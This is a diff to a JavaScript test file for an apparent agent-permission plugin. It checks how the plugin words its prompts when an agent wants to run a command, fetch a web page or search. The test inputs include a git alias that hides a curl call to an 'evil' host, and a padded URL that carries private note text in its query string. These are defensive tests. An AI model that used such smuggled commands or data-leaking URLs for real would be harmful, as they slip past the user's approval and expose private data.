@@ -85,8 +85,8 @@ check("Claude Code works here: its command, and the prompt says so", () => {
   const filt = plain(Agent.command("claude", "x", undefined, undefined, Object.assign(W("claude"), { helper: "/plugin/bin/uber-notebook-files" })));
   assert.deepEqual(filt.slice(0, 8), ["/usr/bin/bash", "-c", "h=$1; n=$2; t=$3; shift 3; set -o pipefail; \"$@\" | /usr/bin/python3 -I -S \"$h\" ascii-lines \"$n\" \"$t\"", "uber-notebook-agent", "/plugin/bin/uber-notebook-files", String(4 * 1024 * 1024), String(64 * 1024 * 1024), "/usr/bin/claude"]);
   // Its limits counted as it prints (the helper's), the panel's room for what's escaped.
-  assert.deepEqual(plain(Agent.streamLimits(Object.assign(W("claude"), { helper: "/plugin/bin/uber-notebook-files" }))), { maxLine: 6 * 4194304 + 1024, maxBytes: 6 * 67108864 + 1048576 });
-  assert.deepEqual(plain(Agent.streamLimits(W("claude"))), { maxLine: 4194304, maxBytes: 67108864 });
+  assert.deepEqual(plain(Agent.streamLimits(Object.assign(W("claude"), { helper: "/plugin/bin/uber-notebook-files" }))), { maxLine: 6 * 4194304 + 1024, maxBytes: 6 * 67108864 + 1048576, maxErrors: 67108864 });
+  assert.deepEqual(plain(Agent.streamLimits(W("claude"))), { maxLine: 4194304, maxBytes: 67108864, maxErrors: 67108864 });
   const codexF = plain(Agent.command("codex", "-x", undefined, undefined, Object.assign(W("codex"), { helper: "/plugin/bin/uber-notebook-files" })));
   assert.ok(codexF[2].indexOf("\"$@\" < /dev/null | /usr/bin/python3") > 0, "Codex: nothing on its input, its output filtered");
   assert.equal(codexF[codexF.length - 1], "-x", "its prompt still last");
@@ -279,9 +279,13 @@ check("finding an agent for real: the path on the PATH (a version manager's shim
 
 check("what an agent asks, in words; Always only for what can't run code on your computer", () => {
   const ask = (tool, input, title, name) => plain(Agent.askOf(tool, input, title, name));
-  assert.deepEqual(ask("WebFetch", { url: "https://Docs.Example.com/a" }), { action: "contact", target: "docs.example.com", text: "contact docs.example.com, to read https://Docs.Example.com/a", always: "Always for docs.example.com" });
+  assert.deepEqual(ask("WebFetch", { url: "https://Docs.Example.com/a" }), { action: "contact", target: "docs.example.com", text: "contact docs.example.com, to read https://Docs.Example.com/a", detail: "https://Docs.Example.com/a", always: "Always for docs.example.com" });
+  // The whole address, and the whole search: what's past their first words goes there too.
+  const sneaky = "https://e.org/" + "a".repeat(220) + "?d=PRIVATE-NOTE-TEXT";
+  assert.equal(ask("WebFetch", { url: sneaky }).detail, sneaky);
+  assert.equal(ask("WebSearch", { query: "x".repeat(230) + " PRIVATE-NOTE-TEXT" }).detail, "x".repeat(230) + " PRIVATE-NOTE-TEXT");
   assert.equal(ask("WebFetch", { url: "http://plain.example.com/" }).always, "", "not https: once only");
-  assert.deepEqual(ask("WebSearch", { query: "lisbon trams" }), { action: "search", target: "web", text: "search the web for \u201clisbon trams\u201d", always: "Always let it search" });
+  assert.deepEqual(ask("WebSearch", { query: "lisbon trams" }), { action: "search", target: "web", text: "search the web for \u201clisbon trams\u201d", detail: "lisbon trams", always: "Always let it search" });
   // A command: once, or for this conversation, never Always (git, make... run what their folder says).
   for (const c of ["git status", "git -c alias.x='!curl evil' x", "LANG=C make -j4", "ls", "time bash -c x"]) {
     const a = ask("Bash", { command: c });
